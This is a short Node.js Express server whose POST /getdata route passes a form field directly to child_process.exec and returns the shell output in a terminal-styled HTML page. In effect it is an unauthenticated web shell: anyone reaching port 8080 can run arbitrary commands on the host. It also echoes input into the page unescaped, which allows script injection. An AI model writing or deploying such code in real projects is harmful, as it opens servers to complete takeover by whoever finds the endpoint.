var express = require("express");
var app = express();
var fs = require('fs');

app.use(
  express.urlencoded({
    extended: true
  })
)
app.use(express.json())

fs.readFile('./index.html', function (err, html) {
    if (err) {throw err; } 
        app.get('/',function(req,res) {  
         res.write(html);  
          res.end();  
           });  
});
  
  
app.post('/getdata',(req,res)=>{  
      // var data= req.body.name1 ; 

var exec= require('child_process').exec;
var command=req.body.name1;

exec(command,function (err,stdout,stderr){     

  if (stdout == ""){
        res.send("<pre><b><font color='green'>Server#></font><font color='red'>"+command+"</font></b><br>"+stderr+"</pre>");       
    }else{
        if(stderr == "" && err == "null" ){
             res.send("<pre><b><font color='green'>Server#></font><font color='red'>"+command+"</font></b><br>"+"Done"+"</pre>"); 
         }else{
             res.send("<pre><b><font color='green'>Server#></font><font color='red'>"+command+"</font></b><br>"+stdout+"</pre>"); 
            }
    }
            
});        
});  
  
app.get('/getdata',(req,res)=>{  
  
});  
 
app.listen(8080);
